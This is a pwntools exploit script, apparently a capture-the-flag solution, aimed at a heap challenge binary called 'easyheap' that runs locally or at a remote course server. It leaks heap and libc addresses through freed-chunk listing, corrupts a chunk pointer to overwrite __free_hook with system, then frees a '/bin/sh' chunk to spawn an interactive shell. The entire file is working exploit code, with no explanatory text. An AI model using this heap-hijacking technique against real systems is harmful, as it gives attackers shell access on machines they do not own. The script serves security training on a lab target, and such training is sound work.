#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('edu-ctf.zoolab.org', 30211)
else:
    r = process('./easyheap')

def add(idx, nlen, name, price):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Index: ', str(idx))
    r.sendlineafter('Length of name: ', str(nlen))
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Price: ', str(price))

def delete(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('Which book do you want to delete: ', str(idx))

def edit(idx, name, price):
    r.sendlineafter('> ', '3')
    r.sendlineafter('Which book do you want to edit: ', str(idx))
    r.sendlineafter('Name: ', name)
    r.sendlineafter('Price: ', str(price))

def list_():
    r.sendlineafter('> ', '4')

def find_(idx):
    r.sendlineafter('> ', '5')
    r.sendlineafter('Index: ', str(idx))

add(0, 0x410, 'A', 0)
add(1, 0x10, 'A', 0)
add(2, 0x28, 'A', 0)
delete(0)
list_()
r.recvuntil('Index:\t')
heap = int(r.recvline()[:-1]) - 0x10
info(f"heap: {hex(heap)}")

delete(1)
delete(2)
add(3, 0x10, 'A', 0)
add(4, 0x28, p64(heap+0x2d0) + p64(0x28), 0)
list_()
r.recvuntil('--------------------')
r.recvuntil('--------------------')
r.recvuntil('Name:\t')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
__free_hook = libc + 0x1eeb28
_system = libc + 0x55410
info(f"libc: {hex(libc)}")

edit(4, p64(heap+0x98), 0)
edit(1, p64(__free_hook - 0x10), 0)
add(5, 0x10, '/bin/sh', str(_system))
delete(5)

r.interactive()